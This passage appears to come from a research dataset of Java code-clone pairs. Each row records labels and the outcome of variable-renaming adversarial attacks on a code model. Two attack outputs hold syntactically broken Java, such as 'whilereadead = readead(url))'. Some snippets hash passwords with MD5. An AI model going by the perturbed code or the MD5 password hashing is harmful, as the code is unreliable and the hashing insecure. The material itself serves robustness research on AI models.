            String WSDLFile = tempDir + File.separator + serviceName + "".wsdl"";
            String tmpWSDLFile = WSDLFile + "".tmp"";
            File inputFile = new File(WSDLFile);
            File tmpFile = new File(tmpWSDLFile);
            if (!inputFile.exists() || inputFile.length() == 0) {
                mLog.debug(""Downloading the WSDL"");
                inputFile.createNewFile();
                InputStream in = url.openStream();
                FileOutputStream out = new FileOutputStream(inputFile);
                URLConnection con = url.openConnection();
                int fileLength = con.getContentLength();
                ReadableByteChannel channelIn = Channels.newChannel(in);
                FileChannel channelOut = out.getChannel();
                channelOut.transferFrom(channelIn, 0, fileLength);
                channelIn.close();
                channelOut.close();
                out.flush();
                out.close();
                in.close();
                Document tmpDocument = XMLUtils.newDocument(new FileInputStream(inputFile));
                NodeList nl1 = tmpDocument.getElementsByTagName(""wsdlsoap:address"");
                for (int i = 0; i < nl1.getLength(); i++) {
                    Node node1 = nl1.item(i);
                    if (node1.getNodeName().equals(""wsdlsoap:address"")) {
                        ((Element) node1).setAttribute(""location"", endpoint);
                    }
                }
                FileOutputStream tmpOut = new FileOutputStream(tmpFile);
                XMLUtils.DocumentToStream(tmpDocument, tmpOut);
                tmpOut.flush();
                tmpOut.close();
                boolean retVal = inputFile.delete();
                if (retVal) {
                    retVal = tmpFile.renameTo(new File(WSDLFile));
                }
                mLog.debug(""Return Value: "" + retVal);
            } else {
                mLog.debug(""The WSDL is already at the ServiceProvider"");
            }
            fileLocation = WSDLFile;
        } catch (MalformedURLException mx) {
            mLog.error(""MalformedURLException: "" + mx.getMessage() + "", cause: "" + mx.getCause().getMessage());
            throw new AxisFault(mx.getMessage(), mx.getCause());
        } catch (IOException ix) {
            mLog.error(""IOException: "" + ix.getMessage() + "", cause: "" + ix.getCause().getMessage());
            throw new AxisFault(ix.getMessage(), ix.getCause());
        } catch (ParserConfigurationException px) {
            mLog.error(""ParserConfigurationException: "" + px.getMessage() + "", cause: "" + px.getCause().getMessage());
            throw new AxisFault(px.getMessage(), px.getCause());
        } catch (SAXException sx) {
            mLog.error(""SAXException: "" + sx.getMessage() + "", cause: "" + sx.getCause().getMessage());
            throw new AxisFault(sx.getMessage(), sx.getCause());
        }
        return fileLocation;
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",631,,LABEL_1,LABEL_0,,-4,"getFile,serviceName,wsdlLocation,endpoint,fileLocation,tempDir,url,WSDLFile,tmpWSDLFile,inputFile,tmpFile,in,out,con,fileLength,channelIn,channelOut,tmpDocument,nl1,i,node1,tmpOut,retVal",,,,0,,0,Greedy,1,0.0009385983149210612,,[]
59,"    @Override
    public void makeRead(final String user, final long databaseID, final long time) throws SQLException {
        final String query = ""insert into fs.read_post (post, user, read_date) values (?, ?, ?)"";
        ensureConnection();
        final PreparedStatement statement = m_connection.prepareStatement(query);
        try {
            statement.setLong(1, databaseID);
            statement.setString(2, user);
            statement.setTimestamp(3, new Timestamp(time));
            final int count = statement.executeUpdate();
            if (0 == count) {
                throw new SQLException(""Nothing updated."");
            }
            m_connection.commit();
        } catch (final SQLException e) {
            m_connection.rollback();
            throw e;
        } finally {
            statement.close();
        }
    }
 <SPLIT>     private void upgradeSchema() throws IOException {
        Statement stmt = null;
        try {
            int i = getSchema();
            LOG.info(""DB is currently at schema "" + i);
            if (i < SCHEMA_VERSION) {
                LOG.info(""Upgrading from schema "" + i + "" to schema "" + SCHEMA_VERSION);
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                while (i < SCHEMA_VERSION) {
                    String qry;
                    switch(i) {
                        case 1:
                            qry = ""UPDATE settings SET val = '2' WHERE var = 'schema'"";
                            stmt.executeUpdate(qry);
                            break;
                    }
                    i++;
                }
                conn.commit();
            }
        } catch (SQLException e) {
            try {
                conn.rollback();
            } catch (SQLException e2) {
                LOG.error(SQL_ERROR, e2);
            }
            LOG.fatal(SQL_ERROR, e);
            throw new IOException(""Error upgrading data store"", e);
        } finally {
            try {
                if (stmt != null) stmt.close();
                conn.setAutoCommit(true);
            } catch (SQLException e) {
                LOG.error(SQL_ERROR, e);
                throw new IOException(""Unable to cleanup SQL resources"", e);
            }
        }
    }
",139,,LABEL_1,LABEL_1,LABEL_1,-1,"makeRead,user,databaseID,time,query,statement,count",,,,0,,0,GA,2452,0.8873930017153422,failed,[]
60,"    public PTask stop(PTask task, SyrupConnection con) throws Exception {
        PreparedStatement s = null;
        ResultSet result = null;
        try {
            s = con.prepareStatementFromCache(sqlImpl().sqlStatements().checkWorkerStatement());
            s.setString(1, task.key());
            result = s.executeQuery();
            con.commit();
            if (result.next()) {
                String url = result.getString(""worker"");
                InputStream i = null;
                try {
                    Object b = new URL(url).getContent();
                    if (b instanceof InputStream) {
                        i = (InputStream) b;
                        byte[] bb = new byte[256];
                        int ll = i.read(bb);
                        String k = new String(bb, 0, ll);
                        if (k.equals(task.key())) {
                            return task;
                        }
                    }
                } catch (Exception e) {
                } finally {
                    if (i != null) {
                        i.close();
                    }
                }
                PreparedStatement s2 = null;
                s2 = con.prepareStatementFromCache(sqlImpl().sqlStatements().resetWorkerStatement());
                s2.setString(1, task.key());
                s2.executeUpdate();
                task = sqlImpl().queryFunctions().readPTask(task.key(), con);
                sqlImpl().loggingFunctions().log(task.key(), LogEntry.STOPPED, con);
                con.commit();
            }
        } finally {
            con.rollback();
            close(result);
        }
        return task;
    }
 <SPLIT>     public String downloadAndOpen(JProgressBar bar) {
        long size = 0;
        try {
            size = photo.getSize();
        } catch (ServiceException ex) {
            ex.printStackTrace();
        }
        try {
            bar.setMaximum((int) size);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        bar.setValue(0);
        image = new File(""TMP/"" + photo.getTitle().getPlainText());
        try {
            if (!image.exists()) {
                image.createNewFile();
                image.deleteOnExit();
                URL url = null;
                BufferedOutputStream fOut = null;
                try {
                    url = new URL(photo.getMediaContents().get(0).getUrl());
                    InputStream html = null;
                    html = url.openStream();
                    fOut = new BufferedOutputStream(new FileOutputStream(image));
                    byte[] buffer = new byte[32 * 1024];
                    int bytesRead = 0;
                    int in = 0;
                    while ((bytesRead = html.read(buffer)) != -1) {
                        in += bytesRead;
                        bar.setValue(in);
                        fOut.write(buffer, 0, bytesRead);
                    }
                    html.close();
                    fOut.close();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return image.getAbsolutePath();
    }
",318,,LABEL_0,LABEL_0,LABEL_0,-1,"stop,task,con,s,result,url,i,b,bb,ll,k,s2",,,,0,,0,GA,4517,1.6789578557014466,failed,[]
61,"    public static Vector[] getLinksFromURLFast(String p_url) throws Exception {
        timeCheck(""getLinksFromURLFast "");
        URL x_url = new URL(p_url);
        URLConnection x_conn = x_url.openConnection();
        InputStreamReader x_is_reader = new InputStreamReader(x_conn.getInputStream());
        BufferedReader x_reader = new BufferedReader(x_is_reader);
        String x_line = null;
        RE e = new RE(""(.*/)"", RE.REG_ICASE);
        System.out.println(""RE: "" + e.toString());
        REMatch x_match = e.getMatch(p_url);
        String x_dir = p_url.substring(x_match.getSubStartIndex(1), x_match.getSubEndIndex(1));
        e = new RE(""(http://.*?)/?"", RE.REG_ICASE);
        x_match = e.getMatch(p_url);
        String x_root = p_url.substring(x_match.getSubStartIndex(1), x_match.getSubEndIndex(1));
        e = new RE(""<a href=\""?(.*?)\""?>(.*?)</a>"", RE.REG_ICASE);
        System.out.println(""RE: "" + e.toString());
        Vector x_links = new Vector(100);
        Vector x_texts = new Vector(100);
        StringBuffer x_buf = new StringBuffer(10000);
        REMatch[] x_matches = null;
        timeCheck(""starting parsing "");
        while ((x_line = x_reader.readLine()) != null) {
            x_buf.append(x_line);
        }
        String x_page = x_buf.toString();
        String x_link = null;
        x_matches = e.getAllMatches(x_page);
        for (int i = 0; i < x_matches.length; i++) {
            x_link = x_page.substring(x_matches[i].getSubStartIndex(1), x_matches[i].getSubEndIndex(1));
            if (x_link.indexOf(""mailto:"") != -1) continue;
            x_link = toAbsolute(x_root, x_dir, x_link);
            x_links.addElement(x_link);
            x_texts.addElement(x_page.substring(x_matches[i].getSubStartIndex(2), x_matches[i].getSubEndIndex(2)));
        }
        Vector[] x_result = new Vector[2];
        x_result[0] = x_links;
        x_result[1] = x_texts;
        timeCheck(""end parsing "");
        return x_result;
    }
 <SPLIT>     public void open(String openStr) throws IOException {
        String commProtocol = ""comm:"";
        String rxtxProtocol = ""rxtx:"";
        String netProtocol = ""net:"";
        if (openStr.startsWith(commProtocol)) {
            CommConnection commConnection = CommConnection.open(openStr.substring(commProtocol.length()));
            this.setInputStream(commConnection.getInputStream());
            this.setOutputStream(commConnection.getOutputStream());
        } else if (openStr.startsWith(rxtxProtocol)) {
            RXTXConnection rxtxConnection = RXTXConnection.open(openStr.substring(commProtocol.length()));
            this.setInputStream(rxtxConnection.getInputStream());
            this.setOutputStream(rxtxConnection.getOutputStream());
        } else if (openStr.startsWith(netProtocol)) {
            SocketConnection socketConn = SocketConnection.open(openStr.substring(netProtocol.length()));
            this.setInputStream(socketConn.getInputStream());
            this.setOutputStream(socketConn.getOutputStream());
        } else {
            URL url = new URL(openStr);
            URLConnection urlConn = url.openConnection();
            this.setInputStream(urlConn.getInputStream());
            try {
                this.setOutputStream(urlConn.getOutputStream());
            } catch (UnknownServiceException e) {
            }
        }
    }
",442,,LABEL_0,LABEL_0,LABEL_0,-1,"getLinksFromURLFast,p_url,x_url,x_conn,x_is_reader,x_reader,x_line,e,x_match,x_dir,x_root,x_links,x_texts,x_buf,x_matches,x_page,x_link,i",,,,0,,0,GA,6348,2.465510670344035,failed,[]
62,"    public ByteBuffer[] write(ByteBuffer[] byteBuffers) {
        if (!m_sslInitiated) {
            return m_writer.write(byteBuffers);
        }
        if (m_engine.getHandshakeStatus() != SSLEngineResult.HandshakeStatus.NOT_HANDSHAKING) {
            if (!NIOUtils.isEmpty(byteBuffers)) {
                m_initialOutBuffer = NIOUtils.concat(m_initialOutBuffer, m_writer.write(byteBuffers));
                byteBuffers = new ByteBuffer[0];
            }
            ByteBuffer buffer = SSL_BUFFER.get();
            ByteBuffer[] buffers = null;
            try {
                SSLEngineResult result = null;
                while (m_engine.getHandshakeStatus() == SSLEngineResult.HandshakeStatus.NEED_WRAP) {
                    buffer.clear();
                    result = m_engine.wrap(byteBuffers, buffer);
                    buffer.flip();
                    buffers = NIOUtils.concat(buffers, NIOUtils.copy(buffer));
                }
                if (result == null) return null;
                if (result.getStatus() != SSLEngineResult.Status.OK) throw new SSLException(""Unexpectedly not ok wrapping handshake data, was "" + result.getStatus());
                reactToHandshakeStatus(result.getHandshakeStatus());
            } catch (SSLException e) {
                throw new RuntimeException(e);
            }
            return buffers;
        }
        ByteBuffer buffer = SSL_BUFFER.get();
        buffer.clear();
        if (NIOUtils.isEmpty(byteBuffers)) {
            if (m_initialOutBuffer == null) return null;
        } else {
            byteBuffers = m_writer.write(byteBuffers);
        }
        if (m_initialOutBuffer != null) {
            byteBuffers = NIOUtils.concat(m_initialOutBuffer, byteBuffers);
            m_initialOutBuffer = null;
        }
        ByteBuffer[] encrypted = null;
        while (!NIOUtils.isEmpty(byteBuffers)) {
            buffer.clear();
            try {
                m_engine.wrap(byteBuffers, buffer);
            } catch (SSLException e) {
                throw new RuntimeException(e);
            }
            buffer.flip();
            encrypted = NIOUtils.concat(encrypted, NIOUtils.copy(buffer));
        }
        return encrypted;
    }
 <SPLIT>     @Override
    public User saveUser(User user) {
        try {
            MessageDigest digest = java.security.MessageDigest.getInstance(""MD5"");
            digest.update(user.getPassword().getBytes(""UTF-8""));
            byte[] hash = digest.digest();
            BigInteger bigInt = new BigInteger(1, hash);
            String hashtext = bigInt.toString(16);
            while (hashtext.length() < 32) {
                hashtext = ""0"" + hashtext;
            }
            user.setPassword(hashtext);
            user.setDataRegjistrimit(new Date());
            return em.merge(user);
        } catch (Exception e) {
            throw new NestedException(e.getMessage(), e);
        }
    }
",370,,LABEL_0,LABEL_1,,-4,"write,byteBuffers,m_initialOutBuffer,buffer,buffers,result,encrypted",,,,0,,0,Greedy,1,0.0006969173749287924,,[]
63,"    private void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>     public static void writeFileToFile(File fin, File fout, boolean append) throws IOException {
        FileChannel inChannel = new FileInputStream(fin).getChannel();
        FileChannel outChannel = new FileOutputStream(fout, append).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } finally {
            if (inChannel != null) try {
                inChannel.close();
            } catch (IOException ex) {
            }
            if (outChannel != null) try {
                outChannel.close();
            } catch (IOException ex) {
            }
        }
    }
",96,"    private void transferChannel(File url, File image) throws IOException {
        FileChannel i inchannel= new FileInputStream(url).getChannel();
        FileChannel ouinputChan new FileOutputStream(image).getChannel();
        try {
             inchannel.transferTo(0,  inchannel.size(), inputChan);
        } catch (IOException e) {
            throw e;
        } finally {
            if ( inchannel != null)  inchannel.close();
            if (inputChan != null) inputChan.close();
        }
    }
",LABEL_1,LABEL_1,0.6096853017807007,1,"copyFile,in,out,inChannel,outChannel",,,,0,"copyFile:transferChannel,in:url,out:image,inChannel: inchannel,outChannel:inputChan,",0,GA,683,0.2425515015920003,ga,[]
64,"    public static byte[] openHttpResult(String urlPath, boolean retry) throws IOException {
        AQUtility.debug(""net"", urlPath);
        URL url = new URL(urlPath);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setUseCaches(false);
        connection.setInstanceFollowRedirects(true);
        connection.setConnectTimeout(NET_TIMEOUT);
        int code = connection.getResponseCode();
        if (code == 307 && retry) {
            String redirect = connection.getHeaderField(""Location"");
            return openHttpResult(redirect, false);
        }
        if (code == -1 && retry) {
            return openHttpResult(urlPath, false);
        }
        AQUtility.debug(""response"", code);
        if (code == -1 || code < 200 || code >= 300) {
            throw new IOException();
        }
        byte[] result = AQUtility.toBytes(connection.getInputStream());
        return result;
    }
 <SPLIT>     public void importarHistoricoDeCotacoesDoDolar(Andamento pAndamento) throws FileNotFoundException, SQLException, Exception {
        pAndamento.delimitarIntervaloDeVariacao(0, 49);
        WSValorSerieVO[] cotacoesPendentesDoDolar = obterCotacoesPendentesDoDolar(pAndamento);
        pAndamento.delimitarIntervaloDeVariacao(50, 100);
        if (cotacoesPendentesDoDolar != null && cotacoesPendentesDoDolar.length > 0) {
            String sql = ""INSERT INTO tmp_TB_COTACAO_DOLAR(DATA, PRECO) VALUES(:DATA, :PRECO)"";
            OraclePreparedStatement stmtDestino = (OraclePreparedStatement) conDestino.prepareStatement(sql);
            stmtDestino.setExecuteBatch(COMANDOS_POR_LOTE);
            int quantidadeDeRegistrosASeremImportados = cotacoesPendentesDoDolar.length;
            try {
                int quantidadeDeRegistrosImportados = 0;
                int numeroDoRegistro = 0;
                for (WSValorSerieVO cotacaoPendenteDoDolar : cotacoesPendentesDoDolar) {
                    ++numeroDoRegistro;
                    stmtDestino.clearParameters();
                    int ano = cotacaoPendenteDoDolar.getAno(), mes = cotacaoPendenteDoDolar.getMes() - 1, dia = cotacaoPendenteDoDolar.getDia();
                    Calendar calendario = Calendar.getInstance();
                    calendario.clear();
                    calendario.set(ano, mes, dia);
                    java.sql.Date vDATA = new java.sql.Date(calendario.getTimeInMillis());
                    BigDecimal vPRECO = cotacaoPendenteDoDolar.getValor();
                    stmtDestino.setDateAtName(""DATA"", vDATA);
                    stmtDestino.setBigDecimalAtName(""PRECO"", vPRECO);
                    int contagemDasInsercoes = stmtDestino.executeUpdate();
                    quantidadeDeRegistrosImportados++;
                    double percentualCompleto = (double) quantidadeDeRegistrosImportados / quantidadeDeRegistrosASeremImportados * 100;
                    pAndamento.setPercentualCompleto((int) percentualCompleto);
                }
                conDestino.commit();
            } catch (Exception ex) {
                conDestino.rollback();
                throw ex;
            } finally {
                if (stmtDestino != null && (!stmtDestino.isClosed())) {
                    stmtDestino.close();
                }
            }
        }
        pAndamento.setPercentualCompleto(100);
    }
",182,,LABEL_0,LABEL_0,LABEL_0,-1,"openHttpResult,urlPath,retry,url,connection,code,redirect,result",,,,0,,0,GA,2869,1.073113739490509,failed,[]
65,"    public static void copyFile(String inFile, String outFile) {
        File in = new File(inFile);
        File out = new File(outFile);
        try {
            FileChannel inChannel = new FileInputStream(in).getChannel();
            FileChannel outChannel = new FileOutputStream(out).getChannel();
            try {
                inChannel.transferTo(0, inChannel.size(), outChannel);
            } finally {
                if (inChannel != null) inChannel.close();
                if (outChannel != null) outChannel.close();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",120,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,inFile,outFile,in,out,inChannel,outChannel",,,,0,,0,GA,2559,0.9780727903048198,failed,[]
66,"    private String readTwitterFead() {
        StringBuilder builder = new StringBuilder();
        HttpClient client = new DefaultHttpClient();
        HttpGet httpGet = new HttpGet(""http://twitter.com/statuses/user_timeline/vogella.json"");
        try {
            HttpResponse response = client.execute(httpGet);
            StatusLine statusLine = response.getStatusLine();
            int statusCode = statusLine.getStatusCode();
            if (statusCode == 200) {
                HttpEntity entity = response.getEntity();
                InputStream content = entity.getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(content));
                String line;
                while ((line = reader.readLine()) != null) {
                    builder.append(line);
                }
            } else {
                Log.e(AndroidJsonTestingActivity.class.getName(), ""Failed to download file"");
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return builder.toString();
    }
 <SPLIT>     public static String encrypt(String text) {
        char[] toEncrypt = text.toCharArray();
        StringBuffer hexString = new StringBuffer();
        try {
            MessageDigest dig = MessageDigest.getInstance(""MD5"");
            dig.reset();
            String pw = """";
            for (int i = 0; i < toEncrypt.length; i++) {
                pw += toEncrypt[i];
            }
            dig.update(pw.getBytes());
            byte[] digest = dig.digest();
            int digestLength = digest.length;
            for (int i = 0; i < digestLength; i++) {
                hexString.append(hexDigit(digest[i]));
            }
        } catch (java.security.NoSuchAlgorithmException ae) {
            ae.printStackTrace();
        }
        return hexString.toString();
    }
",184,,LABEL_0,LABEL_0,LABEL_0,-1,"readTwitterFead,builder,client,httpGet,response,statusLine,statusCode,entity,content,reader,line",,,,0,,0,GA,3824,1.3836397687594095,failed,[]
67,"    public static String hashStringMD5(String string) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(string.getBytes());
        byte byteData[] = md.digest();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < byteData.length; i++) {
            sb.append(Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1));
        }
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < byteData.length; i++) {
            String hex = Integer.toHexString(0xff & byteData[i]);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }
 <SPLIT>     public static String getPagina(String strurl) {
        String resp = """";
        Authenticator.setDefault(new Autenticador());
        try {
            URL url = new URL(strurl);
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String str;
            while ((str = in.readLine()) != null) {
                resp += str;
            }
            in.close();
        } catch (MalformedURLException e) {
            resp = e.toString();
        } catch (IOException e) {
            resp = e.toString();
        } catch (Exception e) {
            resp = e.toString();
        }
        return resp;
    }
",174,,LABEL_0,LABEL_0,LABEL_0,-1,"hashStringMD5,string,md,byteData,sb,i,hexString,hex",,,,0,,0,GA,2986,1.071949549516042,failed,[]
68,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenQueryString = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQueryString);
        URL rewrittenUrl = new URL(fedoraUrl + rewrittenQueryString);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection httpURLConnection = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        httpURLConnection.connect();
        response.setStatus(httpURLConnection.getResponseCode());
        logger.debug(""[status="" + httpURLConnection.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<String>> header : httpURLConnection.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String value : header.getValue()) {
                    if (value != null) {
                        logger.debug(header.getKey() + "": "" + value);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), value);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStream inputStream = httpURLConnection.getInputStream();
        OutputStream outputStream = response.getOutputStream();
        IOUtils.copy(inputStream, outputStream);
    }
 <SPLIT>     public boolean actEstadoEnBD(int idRonda) {
        int intResult = 0;
        String sql = ""UPDATE ronda "" + "" SET estado = 1"" + "" WHERE numeroRonda = "" + idRonda;
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            intResult = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (intResult > 0);
    }
",335,,LABEL_0,LABEL_0,LABEL_0,-1,"doGet,request,response,rewrittenQueryString,rewrittenUrl,httpURLConnection,header,value,inputStream,outputStream",,,,0,,0,GA,3156,1.1777342160542805,failed,[]
69,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
",194,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean model = false;
        java.io.InputStream in = null;
        java.io.OutputStream In = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            In = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] url = new byte[65536];
            int read = -1;
            whilereadead = readead(url)) >= 0) {
                In.write(url, 0, read);
            }
            model = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                In.close();
            } catch (Exception exc) {
            }
        }
        return model;
    }
